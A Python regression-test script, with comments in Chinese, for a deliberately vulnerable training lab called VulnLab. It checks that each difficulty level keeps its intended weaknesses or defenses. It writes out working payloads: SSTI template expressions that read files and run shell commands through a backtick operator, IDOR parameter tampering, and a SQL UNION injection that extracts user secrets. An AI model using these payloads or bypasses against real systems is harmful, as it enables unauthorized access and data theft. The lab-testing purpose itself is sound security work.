_SSTI_FILE_MARKER = "VULNLAB_SSTI_FILE_MARKER"
_SSTI_CMD_MARKER = "VULNLAB_SSTI_CMD_MARKER"


def _ssti_render(base: str, level: str, template: str) -> str:
    """提交一段模板，返回响应正文。"""
    return _post_form(base, f"/ssti/{level}.php", {"template": template})


def _ssti_output(body: str) -> str | None:
    """只取出「渲染结果」那个区块的内容；取不到返回 None。

    ⚠️ 判据必须限定在这个区块里，不能全文搜标记串 ——
    模板内容会被原样回显到 `<textarea>` 里，全文匹配会把
    「我们提交的 payload」误认成「表达式被真的执行了」。

    这和 CMDI / XXE 场景踩过的是同一个坑：
    **检测特征可能被检测行为本身制造出来。**
    这里更极端一点：payload 里带的 marker 串会原封不动地出现在页面上，
    所以只有「渲染结果」区块里的 marker 才说明问题。
    """
    match = re.search(
        r"渲染结果</h3>\s*<pre[^>]*>(.*?)</pre>", body, re.DOTALL
    )
    return match.group(1) if match else None


def check_ssti_low_evaluates_expression(base: str) -> tuple[bool, str, str]:
    """low 档：`{{ 7*7 }}` 应该被求值成 49。

    这是确认「表达式确实在执行」的最小验证 ——
    比直接上读文件的载荷更能说明问题的性质：
    **`{{ }}` 里的内容被当成了代码，而不是数据。**
    """
    body = _ssti_render(base, "low", "{{ 7*7 }}")
    out = _ssti_output(body)

    if out is None:
        return False, "页面没有渲染出结果区块 —— 场景可能已被改坏", ""
    if "49" in out:
        return True, "表达式被求值（7*7 → 49）", "7*7 = 49"
    return False, f"表达式未被求值（渲染结果 = {out.strip()[:40]!r}）", ""


def check_ssti_low_reads_file(base: str) -> tuple[bool, str, str]:
    """low 档：表达式里的函数调用应该能读到服务器上的文件。

    读的是靶场自带的演示文件（内容是固定标记串）——
    理由和 XXE 场景一样：系统文件在不同机器上不一定存在、
    内容也不一样，会让「到底读到没有」变得不可判断。
    """
    body = _ssti_render(base, "low", "{{ file_get_contents('ssti_probe.txt') }}")
    out = _ssti_output(body) or ""

    if _SSTI_FILE_MARKER in out:
        return True, "表达式读到了服务器上的文件（等同于任意文件读取）", _SSTI_FILE_MARKER
    return False, "未读到演示文件内容 —— SSTI 可能已被修掉", ""


def check_ssti_low_benign_works(base: str) -> tuple[bool, str, str]:
    """low 档：正常的算术模板必须照常渲染。

    反向保护 —— 防止有人为了「更安全」把模板功能整个砍掉。
    """
    body = _ssti_render(base, "low", "金额：{{ 199 * 2 }} 元")
    out = _ssti_output(body) or ""

    if "398" in out:
        return True, "正常算术模板照常渲染", "199*2 = 398"
    return False, f"正常模板未渲染（结果 = {out.strip()[:40]!r}）", ""


def check_ssti_medium_blocks_function_call(base: str) -> tuple[bool, str, str]:
    """medium 档：带括号的函数调用应被黑名单拦下（对照组）。"""
    body = _ssti_render(base, "medium", "{{ file_get_contents('ssti_probe.txt') }}")
    out = _ssti_output(body) or ""

    if _SSTI_FILE_MARKER in out:
        return False, "★ 带括号的载荷未被拦下 —— 黑名单已失效", ""
    if "已被过滤" in out:
        return True, "包含括号的表达式被黑名单拦下", "黑名单生效"
    return False, "未观察到明确的拦截提示", ""


def check_ssti_medium_backtick_bypass(base: str) -> tuple[bool, str, str]:
    """medium 档：用反引号（不需要括号）应能执行系统命令。

    PHP 的反引号运算符等价于 `shell_exec()` ——
    它执行一段 shell 命令**并返回输出**，整个写法里没有一个括号。

    于是「不许出现括号 ⟹ 不许调用函数」这个推理就断了。
    用 `echo` 而不是 `whoami` 之类的命令，是因为 `echo` 在
    Windows 的 cmd 和 Linux 的 sh 上行为一致，判据可以跨平台复用。
    """
    body = _ssti_render(
        base, "medium", "{{ `echo VULNLAB_SSTI_CMD_MARKER` }}"
    )
    out = _ssti_output(body) or ""

    if _SSTI_CMD_MARKER in out:
        return True, "反引号运算符绕过黑名单，命令被执行（无括号）", "`echo ...`"
    if "已被过滤" in out:
        return False, "反引号写法也被拦下了 —— 本档的绕过点可能已被堵上", ""
    return False, f"反引号载荷未生效（结果 = {out.strip()[:40]!r}）", ""


def check_ssti_high_blocks_all(base: str) -> tuple[bool, str, str]:
    """high 档：所有「执行类」载荷都必须被拒绝。

    三种写法各打一次：
      · 数字字面量 `7*7`（medium 档允许的，high 档也不认）
      · 带括号的函数调用
      · 反引号运算符（medium 档的绕过手法）

    重点在第三条 —— 它是 medium 的绕过点，必须在 high 档失效，
    否则说明修复只是「换了种黑名单」而不是「取消了执行能力」。
    """
    payloads = [
        ("数字字面量", "{{ 7*7 }}"),
        ("函数调用", "{{ file_get_contents('ssti_probe.txt') }}"),
        ("反引号运算符", "{{ `echo VULNLAB_SSTI_CMD_MARKER` }}"),
    ]
    for label, template in payloads:
        body = _ssti_render(base, "high", template)
        out = _ssti_output(body) or ""
        if _SSTI_FILE_MARKER in out or _SSTI_CMD_MARKER in out:
            return False, f"★ 严重：high 档被绕过（{label}）—— 表达式被执行了", ""
    return True, "数字字面量 / 函数调用 / 反引号运算符全部被拒绝", "无 eval"


def check_ssti_high_var_substitution_works(base: str) -> tuple[bool, str, str]:
    """high 档：白名单变量必须能正常替换。

    反向保护，同时确立基线：
    本档把「表达式」换成了「变量名」，所以必须确认变量替换真的能用 ——
    否则「打不动」可能只是因为功能被砍没了。
    """
    body = _ssti_render(base, "high", "商品：{{ product }}，共 {{ total }} 元")
    out = _ssti_output(body) or ""

    if "示例商品" in out and "398" in out:
        return True, "白名单变量正常替换", "{{ product }} / {{ total }}"
    if "未定义的变量" in out:
        return False, "白名单变量被拒绝了 —— 修复过度，破坏了功能", ""
    return False, f"变量替换未生效（结果 = {out.strip()[:40]!r}）", ""


# -------------------------------------------------------------- 越权场景断言


_IDOR_FLAG = "VULNLAB{idor_horizontal_escalation}"

# 当前登录用户（靶场固定为 alice）与 bob 的订单号
_IDOR_BOB_ORDER_PLAIN = "1003"
_IDOR_BOB_ORDER_OPAQUE = "ord_b5c1e93d74"
_IDOR_ALICE_ORDER_PLAIN = "1001"
_IDOR_ALICE_ORDER_OPAQUE = "ord_7f3a9c2e5b"


def _idor_get(base: str, level: str, **params: str) -> str:
    """查订单详情，返回响应正文。"""
    query = urllib.parse.urlencode(params)
    return _http_request(f"{base.rstrip('/')}/idor/{level}.php?{query}")


def _idor_owner(body: str) -> str | None:
    """从订单卡片里取出「下单用户」；没渲染订单卡片则返回 None。

    ⚠️ 不能用「响应里出现 alice」来判断 ——
    页面上的说明文字里就有 `alice`（比如「当前登录用户是 alice」），
    全文匹配会把说明文字也算成命中。
    判据必须限定在**订单卡片**里的那个字段上。
    """
    match = re.search(
        r"订单详情</h3>.*?下单用户</b><span class=\"mono\">([^<]*)</span>",
        body,
        re.DOTALL,
    )
    return match.group(1) if match else None


def check_idor_low_reads_others_order(base: str) -> tuple[bool, str, str]:
    """low 档：改一下订单号就能读到别人的订单。

    这是水平越权最朴素的形态 ——
    多出来的数据就在那儿，接口只是没问「它是你的吗」。
    """
    body = _idor_get(base, "low", order_id=_IDOR_BOB_ORDER_PLAIN)

    if _IDOR_FLAG in body:
        return True, f"只按订单号查询，读到了别人的订单（id={_IDOR_BOB_ORDER_PLAIN}）", _IDOR_FLAG
    return False, "未能读到别人的订单 —— 场景可能已被改坏", ""


def check_idor_low_own_order_works(base: str) -> tuple[bool, str, str]:
    """low 档：自己的订单必须能正常查（同时确立基线）。

    这条同时排除一种可能：页面**无条件**输出凭证。
    如果那样，上面那条断言就不能说明任何问题。
    """
    body = _idor_get(base, "low", order_id=_IDOR_ALICE_ORDER_PLAIN)

    if _IDOR_FLAG in body:
        return False, "★ 查自己的订单也出现了别人的凭证 —— 场景数据有问题", ""
    if _idor_owner(body) == "alice":
        return True, "自己的订单正常返回", "owner=alice"
    return False, "自己的订单未能正常返回", ""


def check_idor_medium_blocks_without_uid(base: str) -> tuple[bool, str, str]:
    """medium 档：不带 uid 时，查别人的订单应被拦下（对照组）。

    这一条证明该档的归属校验**确实在工作** ——
    它不是「什么都不管」，而是被喂了个假身份。
    """
    body = _idor_get(base, "medium", order_id=_IDOR_BOB_ORDER_PLAIN)

    if _IDOR_FLAG in body:
        return False, "★ 不带 uid 也读到了别人的订单 —— 归属校验已失效", ""
    return True, "归属校验拦下了越权请求", "WHERE id = ? AND user_id = ?"


def check_idor_medium_uid_param_bypass(base: str) -> tuple[bool, str, str]:
    """medium 档：改请求参数里的 `uid` 就能越权。

    这一档的归属校验代码**完全正确**，SQL 也完全正确。
    它错在「第二个问号填的值来自请求参数」——
    校验没被绕过，它只是拿到了一个假身份。

    **校验的正确性，取决于它所依据的那个信息的可信度。**
    """
    body = _idor_get(
        base, "medium", order_id=_IDOR_BOB_ORDER_PLAIN, uid="3"
    )

    if _IDOR_FLAG in body:
        return True, "改请求参数里的 uid 绕过了归属校验（身份来自客户端）", "uid=3"
    return False, "改写 uid 未生效 —— 本档的漏洞点可能已被修掉", ""


def check_idor_high_blocks_enumeration(base: str) -> tuple[bool, str, str]:
    """high 档：短数字订单号应被拒绝（不可枚举 ID 这一层）。"""
    body = _idor_get(base, "high", order_id=_IDOR_BOB_ORDER_PLAIN)

    if _IDOR_FLAG in body:
        return False, "★ 严重：high 档被短数字订单号攻破", ""
    return True, "不可枚举 ID 校验拦下了猜测的订单号", "层 ③ 生效"


def check_idor_high_blocks_known_id(base: str) -> tuple[bool, str, str]:
    """high 档：**即使知道别人订单的真实 ID**，也不该读到。

    这条是整组断言里最重要的一条。

    它的意义在于排除一种错觉：
    「用了随机 ID，所以不会有越权」。

    这里我们把 bob 订单的**真实不可枚举 ID** 直接喂进去 ——
    如果防护只是「让 ID 猜不到」，这一条就会命中。
    它不命中，说明防护**确实是归属校验**，而不是「靠不可枚举」。

    这个区别在真实场景里是决定性的：ID 会从分享链接、浏览器历史、
    日志、Referer、接口响应、邮件里泄露出去 ——
    **一旦泄露，不可枚举就退化成普通 ID，而归属校验不会。**
    """
    body = _idor_get(base, "high", order_id=_IDOR_BOB_ORDER_OPAQUE)

    if _IDOR_FLAG in body:
        return False, "★ 严重：知道真实 ID 就能越权 —— 防护只是「靠猜不到」", ""
    if "不属于当前用户" in body:
        return True, "真实 ID 有效，但归属校验拒绝（防护不依赖 ID 的不可枚举性）", "层 ② 生效"
    return False, "未观察到明确的归属拒绝提示", ""


def check_idor_high_ignores_uid_param(base: str) -> tuple[bool, str, str]:
    """high 档：请求里带 uid 也应被忽略（medium 的绕过手法失效）。

    这一条验证的是「身份来源」这一层：
    就算攻击者知道真实 ID，又同时伪造了 uid，两层也都不会被骗。
    """
    body = _idor_get(
        base, "high", order_id=_IDOR_BOB_ORDER_OPAQUE, uid="3"
    )

    if _IDOR_FLAG in body:
        return False, "★ 严重：伪造 uid 让 high 档被绕过", ""
    if "已忽略" in body:
        return True, "uid 参数被忽略（身份只从服务端取）", "层 ① 生效"
    return False, "未观察到 uid 被忽略的记录", ""


def check_idor_high_own_order_works(base: str) -> tuple[bool, str, str]:
    """high 档：自己的订单必须能正常查。

    反向保护 —— 防止有人为了「更安全」把所有查询都拒了。
    同时确认「不可枚举 ID 校验」没有把合法 ID 也一起挡掉。
    """
    body = _idor_get(base, "high", order_id=_IDOR_ALICE_ORDER_OPAQUE)

    if _idor_owner(body) == "alice":
        return True, "自己的订单正常返回", "层 ③ + 层 ② 均放行"
    return False, "自己的订单也被拒绝了 —— 修复过度，破坏了功能", ""


def derive_internal_base(base: str) -> str:
    """从主靶场地址推导「内网服务」的地址。

    约定：内网服务监听在主靶场端口 +10 上（8080 → 8090）。
    这个约定写在 start.sh / start.bat 里，这里保持一致。
    """
    parsed = urllib.parse.urlparse(base)
    port = parsed.port or 8080
    return f"{parsed.scheme}://{parsed.hostname}:{port + 10}"


def build_checks(internal_base: str) -> list[LabCheck]:
    """构造全部检查项。

    SSRF 相关检查需要知道内网服务的地址，所以做成函数而不是模块级常量。
    """
    return [
        # ── 静态检查（不需要靶场在线）──────────────────────────
        #
        # 放在最前面：如果源码里用了本机跑不了的语法，
        # 后面的行为断言会全部失败，但报错信息看不出根因。
        # 先跑静态检查能把「根因」直接指出来。
        LabCheck("静态 · 无高版本 PHP 语法", "应无", check_no_php_too_new_syntax),

        # ── SQL 注入 ──────────────────────────────────────────────
        LabCheck("SQL · low 档 UNION 注入可读到 secret", "应成功", check_low_union_injectable),
        LabCheck("SQL · low 档原查询为 4 列", "应成功", check_low_column_count),
        LabCheck("SQL · low 档按设计回显数据库错误", "应回显", check_low_error_visible_by_design),
        LabCheck("SQL · medium 档裸 payload 被阻断", "应阻断", check_medium_raw_payload_blocked),
        LabCheck("SQL · medium 档双写绕过可利用", "应成功", check_medium_bypass_works),
        LabCheck("SQL · high 档注入被拒绝", "应拒绝", check_high_rejects_injection),
        LabCheck("SQL · high 档不回显数据库错误", "应不回显", check_no_error_dump_in_high),
        LabCheck("SQL · high 档正常查询仍可用", "应可用", check_high_normal_query_still_works),

        # ── XSS ──────────────────────────────────────────────────
        LabCheck("XSS · low 档载荷未转义输出", "应未转义", check_xss_low_reflects),
        LabCheck("XSS · medium 档 img 事件属性绕过", "应绕过", check_xss_medium_bypass),
        LabCheck("XSS · high 档载荷被转义", "应转义", check_xss_high_escapes),

        # ── 文件上传 ─────────────────────────────────────────────
        LabCheck("上传 · low 档接受 .php 后缀", "应接受", check_upload_low_accepts_script),
        LabCheck("上传 · high 档拒绝 .php 后缀", "应拒绝", check_upload_high_rejects_script),

        # ── SSRF ────────────────────────────────────────────────
        LabCheck(
            "SSRF · low 档可访问内网服务", "应成功",
            partial(check_ssrf_low_reaches_internal, internal_base=internal_base),
        ),
        LabCheck(
            "SSRF · high 档拒绝内网地址", "应拒绝",
            partial(check_ssrf_high_blocks_internal, internal_base=internal_base),
        ),
        LabCheck("SSRF · high 档拒绝 file 协议", "应拒绝", check_ssrf_high_blocks_file_scheme),

        # ── 命令注入 ────────────────────────────────────────────
        LabCheck("CMDI · low 档可追加命令", "应成功", check_cmdi_low_injectable),
        LabCheck("CMDI · medium 档分号被拦", "应拦截", check_cmdi_medium_blocks_semicolon),
        LabCheck("CMDI · medium 档 & 绕过黑名单", "应绕过", check_cmdi_medium_bypass),
        LabCheck("CMDI · high 档注入被拒绝", "应拒绝", check_cmdi_high_blocks_injection),
        LabCheck("CMDI · high 档正常输入仍可用", "应可用", check_cmdi_high_normal_input_works),

        # ── 文件包含 ────────────────────────────────────────────
        LabCheck("LFI · low 档路径穿越成功", "应成功", check_lfi_low_traversal),
        LabCheck("LFI · medium 档裸穿越被拦", "应拦截", check_lfi_medium_blocks_plain_traversal),
        LabCheck("LFI · medium 档双写绕过", "应绕过", check_lfi_medium_double_write_bypass),
        LabCheck("LFI · high 档拒绝全部穿越", "应拒绝", check_lfi_high_blocks_all),
        LabCheck("LFI · high 档正常页面可用", "应可用", check_lfi_high_normal_works),

        # ── PHP 反序列化 ────────────────────────────────────────
        LabCheck("反序列化 · low 档 POP 链写出文件", "应成功", check_unserialize_low_pop_chain),
        LabCheck("反序列化 · low 档无害对象无副作用", "应无副作用", check_unserialize_low_benign_no_side_effect),
        LabCheck("反序列化 · 页面提示的路径可用", "应成功", check_unserialize_documented_relative_path),
        LabCheck("反序列化 · medium 档标准载荷被拦", "应拦截", check_unserialize_medium_blocks_plain),
        LabCheck("反序列化 · medium 档小写类名绕过", "应绕过", check_unserialize_medium_case_bypass),
        LabCheck("反序列化 · high 档拒绝全部 POP 链", "应拒绝", check_unserialize_high_blocks_all),
        LabCheck("反序列化 · high 档白名单内类可用", "应可用", check_unserialize_high_allows_whitelisted),

        # ── XXE ─────────────────────────────────────────────────
        LabCheck("XXE · low 档读到本地文件", "应成功", check_xxe_low_reads_local_file),
        LabCheck("XXE · low 档正常订单可用", "应可用", check_xxe_low_benign_works),
        LabCheck("XXE · medium 档内联实体被拦", "应拦截", check_xxe_medium_blocks_plain),
        LabCheck("XXE · medium 档外部 DTD 绕过", "应绕过", check_xxe_medium_external_dtd_bypass),
        LabCheck("XXE · high 档拒绝全部载荷", "应拒绝", check_xxe_high_blocks_all),
        LabCheck("XXE · high 档正常订单可用", "应可用", check_xxe_high_normal_works),

        # ── JWT ─────────────────────────────────────────────────
        LabCheck("JWT · low 档 alg=none 绕过", "应绕过", check_jwt_low_accepts_alg_none),
        LabCheck("JWT · low 档拒绝错误签名", "应拒绝", check_jwt_low_rejects_bad_signature),
        LabCheck("JWT · low 档正常 token 可用", "应可用", check_jwt_low_valid_token_works),
        LabCheck("JWT · medium 档拒绝 alg=none", "应拒绝", check_jwt_medium_rejects_alg_none),
        LabCheck("JWT · medium 档弱密钥可伪造", "应成功", check_jwt_medium_weak_secret_forgeable),
        LabCheck("JWT · high 档拒绝 alg=none", "应拒绝", check_jwt_high_rejects_alg_none),
        LabCheck("JWT · high 档拒绝弱密钥签名", "应拒绝", check_jwt_high_rejects_weak_secret),
        LabCheck("JWT · high 档正常 token 可用", "应可用", check_jwt_high_valid_token_works),

        # ── CSRF ────────────────────────────────────────────────
        LabCheck("CSRF · low 档跨站请求成功", "应成功", check_csrf_low_cross_site_succeeds),
        LabCheck("CSRF · medium 档拒绝外部 Referer", "应拒绝", check_csrf_medium_rejects_foreign_referer),
        LabCheck("CSRF · medium 档空 Referer 绕过", "应绕过", check_csrf_medium_no_referer_bypass),
        LabCheck("CSRF · medium 档子串 Referer 绕过", "应绕过", check_csrf_medium_substring_referer_bypass),
        LabCheck("CSRF · high 档拒绝跨站请求", "应拒绝", check_csrf_high_rejects_cross_site),
        LabCheck("CSRF · high 档拒绝错误 token", "应拒绝", check_csrf_high_rejects_wrong_token),
        LabCheck("CSRF · high 档正确 token 可用", "应可用", check_csrf_high_accepts_valid_token),
        LabCheck("CSRF · high 档成功后轮换 token", "应轮换", check_csrf_high_rotates_token),
        LabCheck("CSRF · high 档拒绝外部 Referer", "应拒绝", check_csrf_high_rejects_foreign_referer_with_token),

        # ── SSTI ────────────────────────────────────────────────
        LabCheck("SSTI · low 档表达式被求值", "应求值", check_ssti_low_evaluates_expression),
        LabCheck("SSTI · low 档可读服务器文件", "应成功", check_ssti_low_reads_file),
        LabCheck("SSTI · low 档正常模板可用", "应可用", check_ssti_low_benign_works),
        LabCheck("SSTI · medium 档拦下函数调用", "应拦截", check_ssti_medium_blocks_function_call),
        LabCheck("SSTI · medium 档反引号绕过", "应绕过", check_ssti_medium_backtick_bypass),
        LabCheck("SSTI · high 档拒绝全部载荷", "应拒绝", check_ssti_high_blocks_all),
        LabCheck("SSTI · high 档变量替换可用", "应可用", check_ssti_high_var_substitution_works),

        # ── 越权（IDOR）─────────────────────────────────────────
        LabCheck("越权 · low 档读到他人订单", "应成功", check_idor_low_reads_others_order),
        LabCheck("越权 · low 档自己的订单可用", "应可用", check_idor_low_own_order_works),
        LabCheck("越权 · medium 档无 uid 被拒", "应拒绝", check_idor_medium_blocks_without_uid),
        LabCheck("越权 · medium 档伪造 uid 绕过", "应绕过", check_idor_medium_uid_param_bypass),
        LabCheck("越权 · high 档拒绝猜测订单号", "应拒绝", check_idor_high_blocks_enumeration),
        LabCheck("越权 · high 档拒绝已知真实 ID", "应拒绝", check_idor_high_blocks_known_id),
        LabCheck("越权 · high 档忽略伪造 uid", "应拒绝", check_idor_high_ignores_uid_param),
        LabCheck("越权 · high 档自己的订单可用", "应可用", check_idor_high_own_order_works),

        # ── 全页面健康检查 ──────────────────────────────────────
        #
        # 放在最后：它是对「所有页面」的总检查，
        # 前面每条断言验证的是「某个场景的行为对不对」，
        # 这条验证的是「有没有哪个页面直接坏掉」。
        LabCheck("全站 · 页面无 PHP 致命错误", "应全部正常", check_all_pages_render_without_php_error),
    ]


# ------------------------------------------------------------------ 主流程


def find_secret(base: str) -> str:
    """从任意档位尝试取一个 secret，用于确认靶场数据已初始化。"""
    payload = "-1 UNION SELECT 1,username,secret,role FROM users"
    _, body = http_get(build_url(base, "/sqli/low.php", {"id": payload}))
    match = SECRET_PATTERN.search(body)
    return match.group(0) if match else ""


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="VulnLab 回归验证 —— 断言各档位的安全属性未被破坏"
    )
    parser.add_argument("--url", default="http://127.0.0.1:8080", help="靶场地址")
    parser.add_argument("--json", action="store_true", help="以 JSON 输出")
    args = parser.parse_args(argv)

    base = args.url.rstrip("/")

    # 先探活。环境问题要和代码问题区分开 —— 否则 CI 红了却找不到原因。
    status, _ = http_get(f"{base}/index.php")
    if status == 0:
        print(f"[环境错误] 无法连接 {base}", file=sys.stderr)
        print("           请先启动靶场：./start.sh 或 php -S 127.0.0.1:8080 -t html", file=sys.stderr)
        return 2
    if status != 200:
        print(f"[环境错误] {base}/index.php 返回 HTTP {status}", file=sys.stderr)
        return 2

    results: list[CheckResult] = []
    for check in build_checks(derive_internal_base(base)):
        try:
            passed, detail, evidence = check.run(base)
        except Exception as exc:  # noqa: BLE001 - 单条检查异常不该中断整体
            passed, detail, evidence = False, f"检查执行异常: {exc}", ""
        results.append(
            CheckResult(
                name=check.name,
                passed=passed,
                expectation=check.expectation,
                detail=detail,
                evidence=evidence,
            )
        )

    passed_count = sum(1 for r in results if r.passed)
    failed = [r for r in results if not r.passed]

    if args.json:
        print(
            json.dumps(
                {
                    "target": base,
                    "total": len(results),
                    "passed": passed_count,
                    "failed": len(failed),
                    "checks": [r.to_dict() for r in results],
                },
                ensure_ascii=False,
                indent=2,
            )
        )
    else:
        print()
        print("=" * 78)
        print("  VulnLab 回归验证")
        print(f"  目标: {base}")
        print("=" * 78)
        print()

        for result in results:
            mark = "[ 通过 ]" if result.passed else "[ 失败 ]"
            print(f"{mark}  {result.name}")
            print(f"          预期: {result.expectation}")
            print(f"          实际: {result.detail}")
            if result.evidence:
                print(f"          证据: {result.evidence}")
            print()

        print("-" * 78)
        print(f"结果: {passed_count} / {len(results)} 通过")
        if failed:
            print()
            print("失败的断言:")
            for result in failed:
                print(f"  ✗ {result.name}")
                print(f"    {result.detail}")
        print("-" * 78)
        print()

    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
